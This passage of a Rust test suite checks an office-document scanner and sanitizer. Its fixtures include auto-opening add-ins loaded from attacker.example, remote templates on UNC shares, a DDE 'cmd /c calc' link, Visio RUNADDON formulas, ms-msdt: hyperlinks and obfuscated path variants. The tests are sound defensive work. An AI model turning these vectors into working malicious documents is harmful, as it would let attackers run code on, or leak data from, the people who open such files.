            ("/word/settings.xml", "application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"),
            ("/word/webextensions/webextension1.xml", "application/vnd.ms-office.webextension+xml"),
        ]),
    )
    .set(
        "word/webextensions/webextension1.xml",
        r#"<we:webextension xmlns:we="http://schemas.microsoft.com/office/webextensions/webextension/2010/11" id="{1}"><we:reference id="WA104381909" version="1.0.0.0" store="https://attacker.example/addin" storeType="URL"/><we:properties><we:property name="Office.AutoShowTaskpaneWithDocument" value="true"/></we:properties></we:webextension>"#,
    )
    .set(
        "_rels/.rels",
        rels(&[
            ("rId1", "officeDocument", "word/document.xml", false),
            ("rId5", "http://schemas.microsoft.com/office/2011/relationships/webextension", "word/webextensions/webextension1.xml", false),
        ]),
    );
    let r = scan_default(&o.build());
    assert_active(&r, K::EmbeddedScript);
    assert!(r.of_kind(K::EmbeddedScript).any(|f| f.detail.contains("opens automatically")));
    assert!(r.external_refs.iter().any(|e| e.target == "https://attacker.example/addin"));
}

#[test]
fn b10_binary_workbooks_are_never_called_clean() {
    let mut o = Opc::default();
    o.set(
        "[Content_Types].xml",
        content_types(&[(
            "/xl/workbook.bin",
            "application/vnd.ms-excel.sheet.binary.macroEnabled.main",
        )]),
    )
    .set("_rels/.rels", rels(&[("rId1", "officeDocument", "xl/workbook.bin", false)]))
    .set("xl/workbook.bin", vec![0x83, 0x00, 0x9C, 0x01, 0x02, 0x03, 0x04, 0x05]);
    let r = scan_default(&o.build());
    assert_eq!(r.format, crate::FileFormat::Xlsb);
    assert_unverified(&r, K::ScanLimitReached);
}

#[test]
fn b10_the_attached_template_of_a_binary_document_is_a_remote_template() {
    let doc = doc_with_pieces(&[b"text"], "https://attacker.example/t.dot");
    let r = scan_default(&doc);
    assert_active(&r, K::RemoteTemplate);
    let doc = doc_with_pieces(&[b"text"], "\\\\attacker\\share\\t.dot");
    assert!(scan_default(&doc).has(K::UncPathReference));
}

#[test]
fn b10_attachments_of_a_message_are_scanned() {
    let r = scan_default(&msg_with_attachment("invoice.docm", &docm_with_macro().build(), None));
    assert_active(&r, K::VbaMacros);
    let r = scan_default(&msg_with_attachment("invoice.pdf.exe", b"harmless", None));
    assert!(r.has(K::EmbeddedExecutable), "{:#?}", r.findings);
    let r = scan_default(&msg_with_attachment("a.bin", &[0x80, 0x81, 0x82, 0x83, 0x90], None));
    assert_unverified(&r, K::ScanLimitReached);
}

#[test]
fn b10_the_html_body_of_a_message_is_scanned() {
    let r = scan_default(&msg_with_attachment(
        "a.txt",
        b"hello",
        Some("<html><script>x</script></html>"),
    ));
    assert_active(&r, K::HtmlActiveContent);
}

fn vsdx(page: &str) -> Vec<u8> {
    let mut o = Opc::default();
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/visio/document.xml", "application/vnd.ms-visio.drawing.main+xml"),
            ("/visio/pages/page1.xml", "application/vnd.ms-visio.page+xml"),
        ]),
    )
    .set(
        "_rels/.rels",
        rels(&[(
            "rId1",
            "http://schemas.microsoft.com/visio/2010/relationships/document",
            "visio/document.xml",
            false,
        )]),
    )
    .set(
        "visio/document.xml",
        r#"<VisioDocument xmlns="http://schemas.microsoft.com/office/visio/2012/main"/>"#,
    )
    .set("visio/pages/page1.xml", page);
    o.build()
}

#[test]
fn b10_visio_formulas_are_matched_the_way_visio_parses_them() {
    for formula in [
        "RUNADDON (&quot;Evil&quot;)",
        "RUN\tADDON(&quot;x&quot;)",
        "runaddon\u{a0}(&quot;x&quot;)",
    ] {
        let page = format!(
            r#"<PageContents xmlns="http://schemas.microsoft.com/office/visio/2012/main"><Shapes><Shape ID="1"><Cell N="EventDblClick" F="{formula}"/></Shape></Shapes></PageContents>"#
        );
        assert_active(&scan_default(&vsdx(&page)), K::ProgramAction);
    }
}

#[test]
fn b10_visio_hyperlink_sections_are_external_references() {
    let page = r#"<PageContents xmlns="http://schemas.microsoft.com/office/visio/2012/main"><Shapes><Shape ID="1"><Section N="Hyperlink"><Row N="Hyperlink1"><Cell N="Address" V="\\attacker\share\x"/></Row></Section></Shape></Shapes></PageContents>"#;
    let r = scan_default(&vsdx(page));
    assert!(r.has(K::UncPathReference), "{:#?}", r.findings);
}

#[test]
fn b10_a_binary_visio_drawing_is_never_clean() {
    let mut stream = vec![0x56, 0x69, 0x73, 0x69, 0x6F, 0x00, 0x01];
    stream.extend_from_slice(b"junk \x01\x02\x03 truncated chunk");
    let r = scan_default(&cfb_with(&[("VisioDocument", stream.clone())]));
    assert_unverified(&r, K::ScanLimitReached);
    stream.extend_from_slice(b"RunAddOn(\"x\")");
    assert_active(&scan_default(&cfb_with(&[("VisioDocument", stream)])), K::ProgramAction);
}

#[test]
fn b10_opendocument_script_urls_are_matched_without_regard_to_case() {
    let body = r#"<text:a xlink:href="VND.SUN.STAR.SCRIPT:Lib.Mod.Main?language=Basic&amp;location=document">x</text:a>"#;
    assert_active(
        &scan_default(&odf_zip(&[("content.xml", &odf_content(body))])),
        K::OdfEventScript,
    );
    let body = "<text:a xlink:href=\"vnd.sun.star.&#9;script:Lib.Mod.Main\">x</text:a>";
    assert_active(
        &scan_default(&odf_zip(&[("content.xml", &odf_content(body))])),
        K::OdfEventScript,
    );
}

#[test]
fn b10_opendocument_user_interface_bindings_can_run_macros() {
    let cfg = br#"<?xml version="1.0"?><accel:acceleratorlist xmlns:accel="http://openoffice.org/2001/accel" xmlns:xlink="http://www.w3.org/1999/xlink"><accel:item accel:code="F5" xlink:href="vnd.sun.star.script:Lib.Mod.Main?language=Basic&amp;location=document"/></accel:acceleratorlist>"#;
    let r = scan_default(&odf_zip(&[
        ("content.xml", &odf_content("")),
        ("Configurations2/accelerator/current.xml", cfg),
    ]));
    assert_active(&r, K::OdfEventScript);
}

#[test]
fn b10_any_file_under_scripts_is_a_script() {
    let r = scan_default(&odf_zip(&[
        ("content.xml", &odf_content("")),
        ("Scripts/evil.bin", b"payload"),
    ]));
    assert_active(&r, K::EmbeddedScript);
}

#[test]
fn b10_a_nested_package_in_an_object_member_is_scanned() {
    let r = scan_default(&odf_zip(&[
        ("content.xml", &odf_content("")),
        ("Object 1", &docm_with_macro().build()),
    ]));
    assert_active(&r, K::VbaMacros);
}

#[test]
fn b10_a_unreadable_member_of_an_opendocument_package_is_a_gap() {
    let junk: Vec<u8> = (0..64u8).map(|i| i.wrapping_mul(37) | 0x80).collect();
    let r = scan_default(&odf_zip(&[("content.xml", &odf_content("")), ("blob.dat", &junk)]));
    assert_unverified(&r, K::ScanLimitReached);
}

#[test]
fn b10_biff_file_links_are_not_dde_but_service_topic_pairs_are() {
    // U+0001 starts an encoded file URL, in which U+0003 is the directory separator.
    let file = biff_workbook(&[biff_supbook("\u{1}\u{3}share\u{3}book.xls")]);
    let r = scan_default(&cfb_with(&[("Workbook", file)]));
    assert!(!r.has(K::DdeFormula), "{:#?}", r.findings);
    let dde = biff_workbook(&[biff_supbook("cmd\u{3}/c calc")]);
    assert_active(&scan_default(&cfb_with(&[("Workbook", dde)])), K::DdeFormula);
}

// ---- B11: reference targets -------------------------------------------------------------------------

#[test]
fn b11_mixed_slashes_and_escapes_are_network_paths() {
    use crate::report::TargetClass::{DangerousProtocol, OtherScheme, Unc};
    for t in [
        "\\/attacker/share/t.dotm",
        "/\\attacker\\share\\t.dotm",
        "file:///%5C%5Cattacker/share/t.dotm",
        "file:///%255C%255Cattacker/share/t.dotm",
        "//attacker/share",
        "%5C%5Cattacker%5Cshare",
    ] {
        let class = crate::url::classify(t);
        assert!(
            class == Unc || (t.starts_with('%') && class != crate::report::TargetClass::Relative),
            "{t}: {class:?}"
        );
    }
    assert_eq!(crate::url::classify("smb://attacker/share"), DangerousProtocol);
    assert_eq!(crate::url::classify("onenote:https://attacker.example/n"), DangerousProtocol);
    assert_eq!(crate::url::classify("ms-outlook:inbox"), DangerousProtocol);
    assert_eq!(crate::url::classify("ms-whatever:x"), DangerousProtocol);
    assert_eq!(crate::url::classify("ftp://attacker.example/x"), OtherScheme);
    assert_eq!(crate::url::unc_host("\\/attacker/share"), Some("attacker".to_owned()));
}

#[test]
fn b11_a_mixed_slash_template_is_found_even_without_target_mode() {
    let mut o = docx();
    o.set(
        "word/_rels/settings.xml.rels",
        rels(&[("rId1", "attachedTemplate", "\\/attacker/share/t.dotm", false)]),
    );
    let r = scan_default(&o.build());
    assert_active(&r, K::RemoteTemplate);
    assert!(r.has(K::UncPathReference));
}

#[test]
fn b11_linked_media_load_by_themselves() {
    for kind in ["video", "audio", "media"] {
        let mut o = docx();
        o.set(
            "word/_rels/document.xml.rels",
            rels(&[
                ("rId1", "settings", "settings.xml", false),
                ("rId8", kind, "https://t.example/track.mp4", true),
            ]),
        );
        let r = scan_default(&o.build());
        assert_eq!(r.verdict, Verdict::HiddenTrackers, "{kind}: {:#?}", r.findings);
    }
}

// ---- B12: the sanitizer -----------------------------------------------------------------------------

#[test]
fn b12_containers_in_binary_parts_do_not_survive() {
    let bytes = docx_with_binary_part(
        "word/media/payload.dat",
        "application/octet-stream",
        docm_with_macro().build(),
    );
    let out = sanitized(&bytes).expect("sanitized");
    assert!(part(&out.bytes, "word/media/payload.dat").is_none());
    assert_eq!(out.verification.verdict, Verdict::Clean, "{:#?}", out.verification.findings);
}

#[test]
fn b12_relationship_ids_under_any_prefix_are_removed() {
    let mut o = docx();
    o.set(
        "word/_rels/document.xml.rels",
        rels(&[("rId1", "settings", "settings.xml", false), ("rId9", "hyperlink", "https://attacker.example/", true)]),
    )
    .set(
        "word/document.xml",
        format!(r#"<w:document xmlns:w="{W_NS}" xmlns:q="{R_NS}"><w:body><w:p><w:hyperlink q:id="rId9"><w:r><w:t>click</w:t></w:r></w:hyperlink></w:p></w:body></w:document>"#),
    );
    let out = sanitized(&o.build()).expect("sanitized");
    let xml = part(&out.bytes, "word/document.xml").unwrap();
    assert!(!xml.contains("rId9"), "{xml}");
    assert!(xml.contains("click"));
}

#[test]
fn b12_a_utf16_part_is_written_as_utf8_and_says_so() {
    let xml = format!(
        "\u{feff}<?xml version=\"1.0\" encoding=\"UTF-16\"?>{}",
        strip_prolog(&document(&dde_body()))
    );
    let mut bytes = vec![0xFF, 0xFE];
    bytes.extend(xml.trim_start_matches('\u{feff}').encode_utf16().flat_map(u16::to_le_bytes));
    let mut o = docx();
    o.set("word/document.xml", bytes);
    assert!(scan_default(&o.build()).has(K::DdeField));
    let out = sanitized(&o.build()).expect("sanitized");
    let text = part(&out.bytes, "word/document.xml").unwrap();
    assert!(!text.contains("UTF-16") && !text.contains("DDEAUTO"), "{text}");
    assert_ne!(out.verification.verdict, Verdict::ActiveContentNeutralized);
}

#[test]
fn b12_a_dangerous_hyperlink_field_is_neutralised_not_fatal() {
    for target in ["ms-msdt:/id PCWDiagnostic", r"\\\\attacker\\share\\x", "smb://attacker/x"] {
        let body = format!("<w:p>{}</w:p>", field(&format!(" HYPERLINK \"{target}\" ")));
        let out = sanitized(&docx_body(&body).build()).unwrap_or_else(|e| panic!("{target}: {e}"));
        let xml = part(&out.bytes, "word/document.xml").unwrap();
        assert!(!xml.contains("HYPERLINK"), "{xml}");
    }
}

#[test]
fn b12_visio_actions_and_hyperlinks_are_removed_by_the_same_criteria() {
    let page = r#"<PageContents xmlns="http://schemas.microsoft.com/office/visio/2012/main"><Shapes><Shape ID="1"><Cell N="EventDblClick" F="RUNADDON (&quot;Evil&quot;)"/><Cell N="Action" F="HYPERLINK(&quot;ms-msdt:x&quot;)"/><Section N="Hyperlink"><Row N="H1"><Cell N="Address" V="https://attacker.example/"/></Row></Section></Shape></Shapes></PageContents>"#;
    let out = sanitized(&vsdx(page)).expect("sanitized");
    let xml = part(&out.bytes, "visio/pages/page1.xml").unwrap();
    assert!(!xml.contains("RUNADDON") && !xml.contains("attacker"), "{xml}");
}

// ---- B13: denial of service ---------------------------------------------------------------------------

#[test]
fn b13_modules_that_share_a_stream_read_it_once() {
    let source = "Sub Hello()\r\nEnd Sub\r\n".repeat(40);
    let project = vba_project_with_shared_stream(4096, source.as_bytes());
    let start = std::time::Instant::now();
    let r = scan_default(&project);
    assert!(start.elapsed() < std::time::Duration::from_secs(20), "took {:?}", start.elapsed());
    assert_eq!(r.macros.len(), 1, "one stream, one module source");
    assert!(r.has(K::ParserDifferential), "{:#?}", r.findings);
    assert!(r.stats.bytes_inflated < 1 << 20, "{}", r.stats.bytes_inflated);
}

#[test]
fn b13_the_macro_source_of_a_project_is_bounded_in_total() {
    use crate::ole::vba::tests::compress_literal;
    let policy = ScanPolicy { max_macro_source_bytes: 2048, ..ScanPolicy::default() };
    let mut b = arca_container::cfb::writer::CfbBuilder::new();
    let mut dir = Vec::new();
    rec(&mut dir, 0x0001, &1u32.to_le_bytes());
    rec(&mut dir, 0x0003, &1252u16.to_le_bytes());
    rec(&mut dir, 0x0004, b"VBAProject");
    let source = "Sub Hello()\r\nEnd Sub\r\n".repeat(90);
    for i in 0..40 {
        rec(&mut dir, 0x0019, format!("M{i}").as_bytes());
        rec(&mut dir, 0x001A, format!("M{i}").as_bytes());
        rec(&mut dir, 0x0031, &0u32.to_le_bytes());
        rec(&mut dir, 0x0021, b"");
        rec(&mut dir, 0x002B, b"");
        b.add_stream(&format!("VBA/M{i}"), compress_literal(source.as_bytes())).unwrap();
    }
    rec(&mut dir, 0x0010, b"");
    b.add_stream("VBA/dir", compress_literal(&dir)).unwrap();
    b.add_stream("PROJECT", b"ID=\"{00000000-0000-0000-0000-000000000000}\"\r\n".to_vec()).unwrap();
    let r = scan(&b.finish().unwrap(), &policy);
    assert!(r.macros.len() < 40, "{}", r.macros.len());
    assert_active(&r, K::VbaMacros);
    assert!(r.has(K::ScanLimitReached), "{:#?}", r.findings);
}

// ---- the other side: documents made by real programs stay clean -------------------------------------

/// Everything above makes the scanner stricter; this is the guard against it crying wolf. These
/// are files written by Word, Excel, PowerPoint, LibreOffice and Visio (see the README next to
/// them), with nothing active or remote in them.
#[test]
fn documents_written_by_real_programs_are_clean() {
    macro_rules! fixture {
        ($name:literal) => {
            ($name, &include_bytes!(concat!("../../../../tests/fixtures/", $name))[..])
        };
    }
    let files: &[(&str, &[u8])] = &[
        fixture!("lo-latin.doc"),
        fixture!("lo-rich.doc"),
        fixture!("report.doc"),
        fixture!("nested.doc"),
        fixture!("report.docx"),
        fixture!("sheet.xls"),
        fixture!("sheet.xlsx"),
        fixture!("formulas.xlsx"),
        fixture!("deck-rich.ppt"),
        fixture!("slides.ppt"),
        fixture!("deck-rich.pptx"),
        fixture!("slides.pptx"),
        fixture!("report.odt"),
        fixture!("sheet.ods"),
        fixture!("slides.odp"),
        fixture!("report.rtf"),
        fixture!("body.rtf"),
        fixture!("report.pdf"),
        fixture!("slides-impress.pdf"),
        fixture!("drawing.vsdx"),
        fixture!("report.txt"),
        fixture!("sheet.csv"),
    ];
    for (name, data) in files {
        let r = scan_default(data);
        assert_eq!(r.verdict, Verdict::Clean, "{name}: {:#?}", r.findings);
    }
}
